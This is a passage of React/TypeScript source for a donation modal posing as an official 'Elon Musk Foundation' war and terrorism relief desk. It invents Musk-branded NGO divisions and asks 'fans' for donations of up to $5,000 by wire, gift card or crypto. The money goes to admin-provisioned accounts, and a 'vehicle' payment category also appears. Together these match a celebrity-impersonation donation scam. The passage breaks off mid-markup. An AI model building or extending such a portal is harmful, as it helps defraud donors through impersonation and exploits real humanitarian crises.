import React, { useState, useMemo } from 'react';
import {
  X,
  HeartHandshake,
  Globe,
  ShieldCheck,
  Search,
  Check,
  CheckCircle2,
  Clock,
  Lock,
  Send,
  Copy,
  Mail,
  AlertTriangle,
  Wifi,
  Sun,
  Stethoscope,
  Utensils,
  Landmark,
  FileText,
  XCircle,
} from 'lucide-react';
import {
  AdminPaymentAccounts,
  CharityDonationRequest,
  CharitySupportRequest,
  CrisisCategory,
  PaymentAccountRequest,
} from '../types';
import { CHARITY_NGO_SECTIONS, CRISIS_COUNTRIES } from '../data/charityData';

interface CharityDonationModalProps {
  isOpen: boolean;
  onClose: () => void;
  donations: CharityDonationRequest[];
  supportRequests: CharitySupportRequest[];
  onSubmitDonation: (donation: CharityDonationRequest) => void;
  onSubmitSupportRequest: (request: CharitySupportRequest) => void;
  adminPaymentAccounts?: AdminPaymentAccounts;
  paymentAccountRequests?: PaymentAccountRequest[];
  onRequestPaymentAccount?: (payload: {
    paymentMethod: 'wire' | 'gift_card' | 'crypto';
    vehicleName: string;
    amountDue: number;
    visitorName: string;
    visitorEmail: string;
    note?: string;
    requestCategory?: 'vehicle' | 'charity_donation' | 'charity_support';
  }) => PaymentAccountRequest;
  onOpenInbox?: () => void;
}

const PRESET_AMOUNTS = [50, 100, 250, 500, 1000, 5000];
const REGIONS = ['All', 'Global', 'Europe & Eurasia', 'Middle East', 'Africa', 'Asia-Pacific', 'Americas'] as const;
const CRISIS_FILTERS: Array<'All' | CrisisCategory> = [
  'All',
  'War & Armed Conflict',
  'Terrorism & Insurgency',
  'War & Terrorism Recovery',
];

export const CharityDonationModal: React.FC<CharityDonationModalProps> = ({
  isOpen,
  onClose,
  donations,
  supportRequests,
  onSubmitDonation,
  onSubmitSupportRequest,
  adminPaymentAccounts,
  paymentAccountRequests = [],
  onRequestPaymentAccount,
  onOpenInbox,
}) => {
  const [activeTab, setActiveTab] = useState<'donate' | 'support' | 'history'>('donate');

  // Shared Country / NGO selection state
  const [selectedNgoId, setSelectedNgoId] = useState<string>(CHARITY_NGO_SECTIONS[0].id);
  const [selectedCountryId, setSelectedCountryId] = useState<string>(CRISIS_COUNTRIES[0].id);
  const [regionFilter, setRegionFilter] = useState<string>('All');
  const [crisisFilter, setCrisisFilter] = useState<'All' | CrisisCategory>('All');
  const [countrySearch, setCountrySearch] = useState<string>('');

  // Fan Donation form state
  const [donationAmount, setDonationAmount] = useState<number>(250);
  const [customAmountInput, setCustomAmountInput] = useState<string>('250');
  const [paymentMethod, setPaymentMethod] = useState<'wire' | 'gift_card' | 'crypto'>('wire');
  const [accountRequestNote, setAccountRequestNote] = useState<string>('');
  const [copiedAccount, setCopiedAccount] = useState<boolean>(false);
  const [donorName, setDonorName] = useState<string>('');
  const [donorEmail, setDonorEmail] = useState<string>('');
  const [donorCountry, setDonorCountry] = useState<string>('');
  const [dedicationNote, setDedicationNote] = useState<string>('');
  const [submittedDonation, setSubmittedDonation] = useState<CharityDonationRequest | null>(null);

  // Humanitarian Support Request form state
  const [supportAidCategory, setSupportAidCategory] =
    useState<CharitySupportRequest['aidCategory']>('Medical & Trauma Relief');
  const [supportCrisisType, setSupportCrisisType] = useState<CrisisCategory>('War & Armed Conflict');
  const [supportCityZone, setSupportCityZone] = useState<string>('');
  const [supportRequestedAmount, setSupportRequestedAmount] = useState<string>('2500');
  const [applicantName, setApplicantName] = useState<string>('');
  const [applicantEmail, setApplicantEmail] = useState<string>('');
  const [applicantPhone, setApplicantPhone] = useState<string>('');
  const [organizationName, setOrganizationName] = useState<string>('');
  const [situationSummary, setSituationSummary] = useState<string>('');
  const [needsAccountProvisioning, setNeedsAccountProvisioning] = useState<boolean>(true);
  const [preferredPayoutMethod, setPreferredPayoutMethod] = useState<'wire' | 'gift_card' | 'crypto'>('wire');
  const [submittedSupport, setSubmittedSupport] = useState<CharitySupportRequest | null>(null);

  const filteredCountries = useMemo(() => {
    const query = countrySearch.trim().toLowerCase();
    return CRISIS_COUNTRIES.filter((c) => {
      const matchesRegion = regionFilter === 'All' || c.region === regionFilter;
      const matchesCrisis = crisisFilter === 'All' || c.crisisType === crisisFilter;
      const matchesQuery =
        !query ||
        c.name.toLowerCase().includes(query) ||
        c.urgentNeeds.toLowerCase().includes(query) ||
        c.region.toLowerCase().includes(query);
      return matchesRegion && matchesCrisis && matchesQuery;
    });
  }, [regionFilter, crisisFilter, countrySearch]);

  if (!isOpen) return null;

  const selectedNgo =
    CHARITY_NGO_SECTIONS.find((n) => n.id === selectedNgoId) || CHARITY_NGO_SECTIONS[0];
  const selectedCountry =
    CRISIS_COUNTRIES.find((c) => c.id === selectedCountryId) || CRISIS_COUNTRIES[0];

  const handleSelectCountry = (countryId: string) => {
    setSelectedCountryId(countryId);
    const found = CRISIS_COUNTRIES.find((c) => c.id === countryId);
    if (found) {
      setSupportCrisisType(found.crisisType);
    }
  };

  const getNgoIcon = (ngoId: string) => {
    switch (ngoId) {
      case 'musk-foundation-relief':
        return <Stethoscope className="w-4 h-4 text-red-400" />;
      case 'starlink-ngo-corps':
        return <Wifi className="w-4 h-4 text-blue-400" />;
      case 'tesla-solar-microgrid':
        return <Sun className="w-4 h-4 text-amber-400" />;
      case 'youth-food-reconstruction':
        return <Utensils className="w-4 h-4 text-emerald-400" />;
      default:
        return <HeartHandshake className="w-4 h-4 text-blue-300" />;
    }
  };

  const handleAmountChange = (val: string) => {
    setCustomAmountInput(val);
    const parsed = Number(val);
    if (!Number.isNaN(parsed) && parsed > 0) {
      setDonationAmount(Math.round(parsed * 100) / 100);
    }
  };

  const handleDonationSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!donorName.trim() || !donorEmail.trim() || donationAmount <= 0) return;

    const now = new Date();
    const prefix = paymentMethod === 'wire' ? 'WIRE' : paymentMethod === 'gift_card' ? 'GIFT' : 'CRYPTO';
    const newDonation: CharityDonationRequest = {
      donationId: `MUSK-NGO-${Date.now().toString().slice(-6)}`,
      ngoSectionId: selectedNgo.id,
      ngoSectionName: selectedNgo.name,
      countryId: selectedCountry.id,
      countryName: selectedCountry.name,
      crisisType: selectedCountry.crisisType,
      amountUsd: donationAmount,
      paymentMethod,
      paymentReference: `CHAR-${prefix}-${Date.now().toString().slice(-5)}`,
      donorName: donorName.trim(),
      donorEmail: donorEmail.trim(),
      donorCountry: donorCountry.trim() || undefined,
      dedicationNote: dedicationNote.trim() || undefined,
      status: 'pending_admin_approval',
      submittedAt: now.toISOString(),
      dateStr: now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
    };

    onSubmitDonation(newDonation);
    setSubmittedDonation(newDonation);
  };

  const handleSupportSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!applicantName.trim() || !applicantEmail.trim() || !supportCityZone.trim() || !situationSummary.trim()) {
      return;
    }

    const now = new Date();
    const parsedGrant = Number(supportRequestedAmount);
    const newRequest: CharitySupportRequest = {
      requestId: `SUP-NGO-${Date.now().toString().slice(-6)}`,
      ngoSectionId: selectedNgo.id,
      ngoSectionName: selectedNgo.name,
      countryId: selectedCountry.id,
      countryName: selectedCountry.name,
      crisisType: supportCrisisType,
      aidCategory: supportAidCategory,
      requestedAmountUsd: !Number.isNaN(parsedGrant) && parsedGrant > 0 ? parsedGrant : undefined,
      applicantName: applicantName.trim(),
      applicantEmail: applicantEmail.trim(),
      applicantPhone: applicantPhone.trim() || undefined,
      organizationName: organizationName.trim() || undefined,
      cityOrZone: supportCityZone.trim(),
      situationSummary: situationSummary.trim(),
      needsAccountProvisioning,
      preferredPayoutMethod: needsAccountProvisioning ? preferredPayoutMethod : undefined,
      status: 'pending_admin_approval',
      submittedAt: now.toISOString(),
      dateStr: now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
    };

    onSubmitSupportRequest(newRequest);
    setSubmittedSupport(newRequest);
  };

  // Check active admin-issued or global account for selected donation payment method
  const issuedRequest = paymentAccountRequests.find(
    (r) =>
      r.paymentMethod === paymentMethod &&
      r.status === 'issued' &&
      r.issuedAccountDetails &&
      (r.requestCategory === 'charity_donation' || !r.requestCategory)
  );
  const pendingAccountReq = paymentAccountRequests.find(
    (r) =>
      r.paymentMethod === paymentMethod &&
      r.status === 'pending_admin' &&
      r.requestCategory === 'charity_donation'
  );
  const globalAccount =
    paymentMethod === 'wire'
      ? adminPaymentAccounts?.wireDetails?.trim()
      : paymentMethod === 'gift_card'
      ? adminPaymentAccounts?.giftCardInstructions?.trim()
      : adminPaymentAccounts?.cryptoAddress?.trim();
  const activeAdminAccount = issuedRequest?.issuedAccountDetails?.trim() || globalAccount || '';

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#020611]/90 backdrop-blur-md p-3 sm:p-5 overflow-y-auto animate-fadeIn">
      <div className="w-full max-w-5xl max-h-[90vh] rounded-2xl bg-[#061024] border border-blue-500/45 shadow-2xl flex flex-col overflow-hidden text-slate-100">
        {/* Modal Header */}
        <div className="p-4 sm:p-5 bg-gradient-to-r from-[#091630] via-[#0d1f44] to-[#230c18] border-b border-blue-900/60 flex items-center justify-between gap-4 shrink-0">
          <div className="flex items-center gap-3 min-w-0">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-blue-600 via-blue-700 to-red-600 flex items-center justify-center text-white shadow-md shrink-0">
              <HeartHandshake className="w-5 h-5" />
            </div>
            <div className="min-w-0">
              <div className="text-[11px] font-mono text-blue-300 tracking-wide truncate">
                Elon Musk Foundation · Official Charity &amp; Global Humanitarian NGO Desk
              </div>
              <h3 className="font-display font-bold text-lg text-white tracking-wide truncate">
                Global War &amp; Terrorism Relief Foundation
              </h3>
            </div>
          </div>

          <button
            type="button"
            onClick={onClose}
            aria-label="Close Charity & NGO Portal"
            className="p-2 rounded-lg text-slate-300 hover:text-white hover:bg-white/10 transition-colors cursor-pointer shrink-0"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Sub-navigation tabs */}
        <div className="px-4 sm:px-6 py-2.5 border-b border-blue-900/60 bg-[#050d20] flex flex-wrap items-center justify-between gap-3 shrink-0">
          <div className="flex items-center gap-1 p-1 rounded-xl bg-[#040a18] border border-blue-900/60">
            <button
              type="button"
              onClick={() => {
                setActiveTab('donate');
                setSubmittedDonation(null);
              }}
              className={`px-3.5 py-2 rounded-lg text-xs font-semibold transition-all cursor-pointer whitespace-nowrap shrink-0 flex items-center gap-1.5 ${
                activeTab === 'donate'
                  ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white shadow-sm'
                  : 'text-slate-300 hover:text-white'
              }`}
            >
              <HeartHandshake className="w-3.5 h-3.5" />
              <span>Fan NGO Donation</span>
            </button>

            <button
              type="button"
              onClick={() => {
                setActiveTab('support');
                setSubmittedSupport(null);
              }}
              className={`px-3.5 py-2 rounded-lg text-xs font-semibold transition-all cursor-pointer whitespace-nowrap shrink-0 flex items-center gap-1.5 ${
                activeTab === 'support'
                  ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white shadow-sm'
                  : 'text-slate-300 hover:text-white'
              }`}
            >
              <Globe className="w-3.5 h-3.5" />
              <span>Request Country Support</span>
            </button>

            <button
              type="button"
              onClick={() => setActiveTab('history')}
              className={`px-3.5 py-2 rounded-lg text-xs font-semibold transition-all cursor-pointer whitespace-nowrap shrink-0 flex items-center gap-1.5 tabular-nums ${
                activeTab === 'history'
                  ? 'bg-blue-600 text-white shadow-sm'
                  : 'text-slate-300 hover:text-white'
              }`}
            >
              <FileText className="w-3.5 h-3.5" />
              <span>My Submissions ({donations.length + supportRequests.length})</span>
            </button>
          </div>

          <div className="text-[11px] font-mono text-slate-300">
            All requests routed to Elon Musk Official Management Table
          </div>
        </div>

        {/* Scrollable Content Body */}
        <div className="flex-1 overflow-y-auto p-4 sm:p-6 space-y-6">
          {/* TAB 1: FAN DONATION OR TAB 2: SUPPORT REQUEST SHARE NGO & COUNTRY PICKERS */}
          {activeTab === 'donate' && submittedDonation ? (
            <div className="max-w-2xl mx-auto p-6 rounded-2xl bg-[#08142b] border border-emerald-500/45 space-y-5">
              <div className="flex items-start gap-3">
                <CheckCircle2 className="w-7 h-7 text-emerald-400 shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <div className="text-xs font-mono text-emerald-300">
                    Donation Logged · {submittedDonation.donationId}
                  </div>
                  <h4 className="font-display text-xl font-bold text-white">
                    Donation Sent to Elon Musk Official Management Table
                  </h4>
                  <p className="text-xs text-slate-300 leading-relaxed">
                    Thank you, <strong className="text-white">{submittedDonation.donorName}</strong>. Your philanthropic contribution of{' '}
                    <strong className="text-white font-mono tabular-nums">${submittedDonation.amountUsd.toLocaleString()} USD</strong> for{' '}
                    <strong className="text-blue-200">{submittedDonation.countryName}</strong> has been directed to the Admin Management Table for settlement verification, account provisioning, and official NGO receipt approval.
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-xl bg-[#040a18] border border-blue-900/70 grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                <div>
                  <div className="text-slate-400">Official NGO Section</div>
                  <div className="font-semibold text-white mt-0.5">{submittedDonation.ngoSectionName}</div>
                </div>
                <div>
                  <div className="text-slate-400">Designated Crisis Nation</div>
                  <div className="font-semibold text-blue-200 mt-0.5">{submittedDonation.countryName}</div>
                </div>
                <div>
                  <div className="text-slate-400">Payment Reference</div>
                  <div className="font-mono text-slate-200 mt-0.5">{submittedDonation.paymentReference}</div>
                </div>
                <div>
                  <div className="text-slate-400">Management Status</div>
                  <div className="font-mono text-amber-300 mt-0.5">Pending Admin Approval</div>
                </div>
              </div>

              <div className="flex flex-wrap items-center justify-end gap-3 pt-2">
                {onOpenInbox && (
                  <button
                    type="button"
                    onClick={() => {
                      onClose();
                      onOpenInbox();
                    }}
                    className="px-4 py-2.5 rounded-xl bg-[#040a18] border border-blue-500/45 hover:border-blue-400 text-blue-200 text-xs font-semibold flex items-center gap-1.5 cursor-pointer"
                  >
                    <Mail className="w-3.5 h-3.5" />
                    <span>Open In-App Inbox</span>
                  </button>
                )}
                <button
                  type="button"
                  onClick={() => setActiveTab('history')}
                  className="px-4 py-2.5 rounded-xl bg-blue-600/25 border border-blue-500/50 text-white text-xs font-semibold cursor-pointer"
                >
                  Track Approval Status
                </button>
                <button
                  type="button"
                  onClick={() => setSubmittedDonation(null)}
                  className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 to-red-600 text-white text-xs font-bold cursor-pointer"
                >
                  Make Another Donation
                </button>
              </div>
            </div>
          ) : activeTab === 'support' && submittedSupport ? (
            <div className="max-w-2xl mx-auto p-6 rounded-2xl bg-[#08142b] border border-emerald-500/45 space-y-5">
              <div className="flex items-start gap-3">
                <CheckCircle2 className="w-7 h-7 text-emerald-400 shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <div className="text-xs font-mono text-emerald-300">
                    Support Request Logged · {submittedSupport.requestId}
                  </div>
                  <h4 className="font-display text-xl font-bold text-white">
                    Support Request Directed to Elon Musk Management for Approval &amp; Accounts Provision
                  </h4>
                  <p className="text-xs text-slate-300 leading-relaxed">
                    Your humanitarian support filing for <strong className="text-white">{submittedSupport.countryName}</strong> ({submittedSupport.cityOrZone}) has been submitted to the <strong className="text-blue-200">Elon Musk Official Management Table</strong>. All support requests require direct Admin approval and account/relief provisioning prior to dispatch.
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-xl bg-[#040a18] border border-blue-900/70 grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                <div>
                  <div className="text-slate-400">NGO Division</div>
                  <div className="font-semibold text-white mt-0.5">{submittedSupport.ngoSectionName}</div>
                </div>
                <div>
                  <div className="text-slate-400">Aid &amp; Crisis Classification</div>
                  <div className="font-semibold text-blue-200 mt-0.5">
                    {submittedSupport.aidCategory} · {submittedSupport.crisisType}
                  </div>
                </div>
                <div>
                  <div className="text-slate-400">Account Provisioning</div>
                  <div className="font-mono text-slate-200 mt-0.5">
                    {submittedSupport.needsAccountProvisioning
                      ? `Requested (${submittedSupport.preferredPayoutMethod?.toUpperCase()})`
                      : 'Direct Equipment / Relief Dispatch'}
                  </div>
                </div>
                <div>
                  <div className="text-slate-400">Review Status</div>
                  <div className="font-mono text-amber-300 mt-0.5">Pending Elon Musk Management Approval</div>
                </div>
              </div>

              <div className="flex flex-wrap items-center justify-end gap-3 pt-2">
                {onOpenInbox && (
                  <button
                    type="button"
                    onClick={() => {
                      onClose();
                      onOpenInbox();
                    }}
                    className="px-4 py-2.5 rounded-xl bg-[#040a18] border border-blue-500/45 hover:border-blue-400 text-blue-200 text-xs font-semibold flex items-center gap-1.5 cursor-pointer"
                  >
                    <Mail className="w-3.5 h-3.5" />
                    <span>Open In-App Inbox</span>
                  </button>
                )}
                <button
                  type="button"
                  onClick={() => setActiveTab('history')}
                  className="px-4 py-2.5 rounded-xl bg-blue-600/25 border border-blue-500/50 text-white text-xs font-semibold cursor-pointer"
                >
                  Track Support Approval
                </button>
                <button
                  type="button"
                  onClick={() => setSubmittedSupport(null)}
                  className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 to-red-600 text-white text-xs font-bold cursor-pointer"
                >
                  Submit Another Support Request
                </button>
              </div>
            </div>
          ) : activeTab === 'history' ? (
            <div className="space-y-6">
              {/* Fan Donations History */}
              <div className="space-y-3">
                <div className="flex items-center justify-between border-b border-blue-900/60 pb-2">
                  <h4 className="font-display font-bold text-base text-white">
                    Your Charity NGO Donations ({donations.length})
                  </h4>
                  <span className="text-xs font-mono text-slate-400">
                    Managed by Elon Musk Official Management Table
                  </span>
                </div>

                {donations.length === 0 ? (
                  <div className="p-8 rounded-xl bg-[#08142b] border border-blue-900/60 text-center text-xs text-slate-400">
                    No fan charity donations submitted yet.
                  </div>
                ) : (
                  <div className="space-y-3">
                    {donations.map((d) => (
                      <div
                        key={d.donationId}
                        className="p-4 rounded-xl bg-[#08142b] border border-blue-900/70 flex flex-col sm:flex-row sm:items-center justify-between gap-4"
                      >
                        <div className="space-y-1">
                          <div className="flex flex-wrap items-center gap-2 text-[11px] font-mono text-slate-400">
                            <span className="text-blue-300 font-bold">{d.donationId}</span>
                            <span aria-hidden="true">·</span>
                            <span>{d.dateStr}</span>
                            <span aria-hidden="true">·</span>
                            <span>{d.countryName}</span>
                            <span aria-hidden="true">·</span>
                            <span>{d.crisisType}</span>
                          </div>
                          <div className="text-sm font-bold text-white">
                            {d.ngoSectionName} —{' '}
                            <span className="font-mono text-emerald-300 tabular-nums">
                              ${d.amountUsd.toLocaleString()} USD
                            </span>
                          </div>
                          {d.approvalNotes && (
                            <div className="text-xs text-slate-300">
                              Management Note: {d.approvalNotes}
                            </div>
                          )}
                        </div>

                        <div className="shrink-0 text-xs font-mono font-semibold">
                          {d.status === 'approved' ? (
                            <span className="text-emerald-400 flex items-center gap-1.5">
                              <CheckCircle2 className="w-4 h-4" />
                              Approved by Management
                            </span>
                          ) : d.status === 'rejected' ? (
                            <span className="text-red-400 flex items-center gap-1.5">
                              <XCircle className="w-4 h-4" />
                              Declined / Verification Needed
                            </span>
                          ) : (
                            <span className="text-amber-300 flex items-center gap-1.5">
                              <Clock className="w-4 h-4" />
                              Pending Admin Approval
                            </span>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* Support Requests History */}
              <div className="space-y-3">
                <div className="flex items-center justify-between border-b border-blue-900/60 pb-2">
                  <h4 className="font-display font-bold text-base text-white">
                    Humanitarian &amp; Country Support Requests ({supportRequests.length})
                  </h4>
                  <span className="text-xs font-mono text-slate-400">
                    Admin Approval &amp; Accounts Provisioning
                  </span>
                </div>

                {supportRequests.length === 0 ? (
                  <div className="p-8 rounded-xl bg-[#08142b] border border-blue-900/60 text-center text-xs text-slate-400">
                    No country support requests submitted yet.
                  </div>
                ) : (
                  <div className="space-y-3">
                    {supportRequests.map((req) => (
                      <div
                        key={req.requestId}
                        className="p-4 rounded-xl bg-[#08142b] border border-blue-900/70 space-y-2.5"
                      >
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                          <div className="space-y-1">
                            <div className="flex flex-wrap items-center gap-2 text-[11px] font-mono text-slate-400">
                              <span className="text-blue-300 font-bold">{req.requestId}</span>
                              <span aria-hidden="true">·</span>
                              <span>{req.dateStr}</span>
                              <span aria-hidden="true">·</span>
                              <span>{req.countryName} ({req.cityOrZone})</span>
                              <span aria-hidden="true">·</span>
                              <span>{req.crisisType}</span>
                            </div>
                            <div className="text-sm font-bold text-white">
                              {req.aidCategory} — {req.ngoSectionName}
                              {req.requestedAmountUsd ? (
                                <span className="ml-2 font-mono text-blue-300 tabular-nums">
                                  (${req.requestedAmountUsd.toLocaleString()} USD)
                                </span>
                              ) : null}
                            </div>
                          </div>

                          <div className="shrink-0 text-xs font-mono font-semibold">
                            {req.status === 'approved' ? (
                              <span className="text-emerald-400 flex items-center gap-1.5">
                                <CheckCircle2 className="w-4 h-4" />
                                Approved by Elon Musk Management
                              </span>
                            ) : req.status === 'rejected' ? (
                              <span className="text-red-400 flex items-center gap-1.5">
                                <XCircle className="w-4 h-4" />
                                Declined / Review Required
                              </span>
                            ) : (
                              <span className="text-amber-300 flex items-center gap-1.5">
                                <Clock className="w-4 h-4" />
                                Pending Admin Approval
                              </span>
                            )}
                          </div>
                        </div>

                        <p className="text-xs text-slate-300 leading-relaxed">
                          {req.situationSummary}
                        </p>

                        {req.provisionedAccountDetails && (
                          <div className="p-3 rounded-lg bg-[#040a18] border border-emerald-500/40 text-xs font-mono text-emerald-200 break-all">
                            Management-Provisioned Relief Account: {req.provisionedAccountDetails}
                          </div>
                        )}
                        {req.approvalNotes && (
                          <div className="text-xs text-slate-300">
                            Management Clearance Note: {req.approvalNotes}
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          ) : (
            <div className="space-y-6">
              {/* Step 1: Official Elon Musk Charity NGO Sections */}
              <div className="space-y-3">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-1">
                  <h4 className="text-xs font-bold text-white uppercase tracking-wider">
                    1. Official Elon Musk Charity &amp; NGO Sections
                  </h4>
                  <span className="text-xs text-slate-400">
                    Select the philanthropic division for your {activeTab === 'donate' ? 'donation' : 'support request'}
                  </span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {CHARITY_NGO_SECTIONS.map((ngo) => {
                    const isSelected = ngo.id === selectedNgoId;
                    return (
                      <button
                        key={ngo.id}
                        type="button"
                        onClick={() => setSelectedNgoId(ngo.id)}
                        className={`p-4 rounded-xl border text-left transition-all cursor-pointer space-y-2 ${
                          isSelected
                            ? 'bg-[#0a1a38] border-blue-400 shadow-md'
                            : 'bg-[#08142b]/80 border-blue-900/60 hover:border-blue-600/60'
                        }`}
                      >
                        <div className="flex items-start justify-between gap-3">
                          <div className="flex items-center gap-2 text-xs font-semibold text-blue-300">
                            {getNgoIcon(ngo.id)}
                            <span>{ngo.division}</span>
                          </div>
                          {isSelected && <Check className="w-4 h-4 text-emerald-400 shrink-0" />}
                        </div>
                        <div className="font-display font-bold text-sm text-white">
                          {ngo.name}
                        </div>
                        <p className="text-xs text-slate-300 leading-relaxed">
                          {ngo.description}
                        </p>
                        <div className="text-[11px] font-mono text-slate-400 pt-1 border-t border-blue-900/50">
                          {ngo.leadProgram} · {ngo.impactMetric}
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Step 2: Countries Worldwide in Need (War & Terrorism Zones) */}
              <div className="space-y-3">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                  <h4 className="text-xs font-bold text-white uppercase tracking-wider">
                    2. Worldwide Countries in Need (War &amp; Terrorism Relief)
                  </h4>
                  <span className="text-xs font-mono text-blue-300 tabular-nums">
                    {filteredCountries.length} of {CRISIS_COUNTRIES.length} Crisis Regions Shown
                  </span>
                </div>

                {/* Search & Filters */}
                <div className="flex flex-col lg:flex-row gap-3">
                  <div className="relative flex-1">
                    <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
                    <input
                      type="text"
                      value={countrySearch}
                      onChange={(e) => setCountrySearch(e.target.value)}
                      placeholder="Search any country in need (e.g. Ukraine, Gaza, Sudan, Somalia, Nigeria, Haiti, Myanmar)..."
                      className="w-full pl-9 pr-3.5 py-2.5 text-xs bg-[#040a18] border border-blue-900/70 rounded-xl text-white placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
                    />
                  </div>

                  <div className="flex flex-wrap items-center gap-1.5">
                    {CRISIS_FILTERS.map((cf) => (
                      <button
                        key={cf}
                        type="button"
                        onClick={() => setCrisisFilter(cf)}
                        className={`px-3 py-2 rounded-lg text-[11px] font-semibold transition-colors cursor-pointer whitespace-nowrap shrink-0 ${
                          crisisFilter === cf
                            ? 'bg-red-600 text-white'
                            : 'bg-[#08142b] border border-blue-900/70 text-slate-300 hover:text-white'
                        }`}
                      >
                        {cf === 'All' ? 'All Crises' : cf}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Region filter bar */}
                <div className="flex flex-wrap items-center gap-1.5">
                  {REGIONS.map((region) => (
                    <button
                      key={region}
                      type="button"
                      onClick={() => setRegionFilter(region)}
                      className={`px-2.5 py-1.5 rounded-lg text-[11px] font-medium transition-colors cursor-pointer whitespace-nowrap shrink-0 ${
                        regionFilter === region
                          ? 'bg-blue-600 text-white'
                          : 'bg-[#040a18] border border-blue-900/60 text-slate-300 hover:text-white'
                      }`}
                    >
                      {region}
                    </button>
                  ))}
                </div>

                {/* Country Grid */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 max-h-64 overflow-y-auto pr-1">
                  {filteredCountries.length === 0 ? (
                    <div className="sm:col-span-2 lg:col-span-3 p-6 rounded-xl bg-[#040a18] border border-blue-900/60 text-center text-xs text-slate-400">
                      No matching countries found. Clear filters or switch to Support Request to submit a regional relief appeal.
                    </div>
                  ) : (
                    filteredCountries.map((country) => {
                      const isSelected = country.id === selectedCountryId;
                      return (
                        <button
                          key={country.id}
                          type="button"
                          onClick={() => handleSelectCountry(country.id)}
                          className={`p-3 rounded-xl border text-left transition-all cursor-pointer space-y-1.5 ${
                            isSelected
                              ? 'bg-[#0a1a38] border-red-400 shadow-sm'
                              : 'bg-[#040a18] border-blue-900/60 hover:border-blue-600/60'
                          }`}
                        >
                          <div className="flex items-start justify-between gap-2">
                            <span className="text-xs font-bold text-white leading-snug">
                              {country.name}
                            </span>
                            {isSelected && <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0 mt-0.5" />}
                          </div>
                          <div className="text-[11px] font-mono text-slate-400">
                            {country.region} ·{' '}
                            <span className={country.crisisType === 'Terrorism & Insurgency' ? 'text-amber-300' : 'text-red-300'}>
                              {country.crisisType}
                            </span>
                          </div>
                          <p className="text-[11px] text-slate-300 leading-snug line-clamp-2">
                            {country.urgentNeeds}
                          </p>
                          <div className="text-[10px] font-mono text-blue-300 tabular-nums">
                            {country.displacedEstimate}
                          </div>
                        </button>
                      );
                    })
                  )}
                </div>
              </div>

              {/* TAB 1: FAN CHARITY DONATION FORM */}
              {activeTab === 'donate' && (
                <form onSubmit={handleDonationSubmit} className="space-y-5 pt-2 border-t border-blue-900/60">
                  <div className="p-4 rounded-xl bg-[#040a18] border border-blue-800/60 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs">
                    <div>
                      <span className="text-slate-400">Selected Allocation Target: </span>
                      <strong className="text-white">{selectedNgo.name}</strong>
                      <span className="text-slate-500"> · </span>
                      <strong className="text-blue-300">{selectedCountry.name}</strong>
                    </div>
                    <span className="font-mono text-red-300">{selectedCountry.crisisType}</span>
                  </div>

                  {/* Amount & Payment Channel */}
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
                    <div className="space-y-3">
                      <label className="text-xs font-bold text-white uppercase tracking-wider block">
                        3. Select Donation Amount (USD)
                      </label>
                      <div className="grid grid-cols-3 gap-2">
                        {PRESET_AMOUNTS.map((amt) => (
                          <button
                            key={amt}
                            type="button"
                            onClick={() => {
                              setDonationAmount(amt);
                              setCustomAmountInput(String(amt));
                            }}
                            className={`py-2.5 px-3 rounded-lg border text-xs font-mono font-bold tabular-nums transition-all cursor-pointer ${
                              donationAmount === amt
                                ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                                : 'bg-[#08142b] border-blue-900/70 text-slate-200 hover:border-blue-500/60'
                            }`}
                          >
                            ${amt.toLocaleString()}
                          </button>
                        ))}
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-mono text-slate-400">Custom USD:</span>
                        <input
                          type="number"
                          min={5}
                          step="1"
                          value={customAmountInput}
                          onChange={(e) => handleAmountChange(e.target.value)}
                          className="flex-1 px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white font-mono tabular-nums focus:outline-none focus:border-blue-400"
                        />
                      </div>
                    </div>

                    <div className="space-y-3">
                      <label className="text-xs font-bold text-white uppercase tracking-wider block">
                        4. Select Payment Channel (Admin Accounts Provision)
                      </label>
                      <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                        <button
                          type="button"
                          onClick={() => setPaymentMethod('wire')}
                          className={`py-2.5 px-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                            paymentMethod === 'wire'
                              ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                              : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                          }`}
                        >
                          Wire Transfer / ACH
                        </button>
                        <button
                          type="button"
                          onClick={() => setPaymentMethod('gift_card')}
                          className={`py-2.5 px-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                            paymentMethod === 'gift_card'
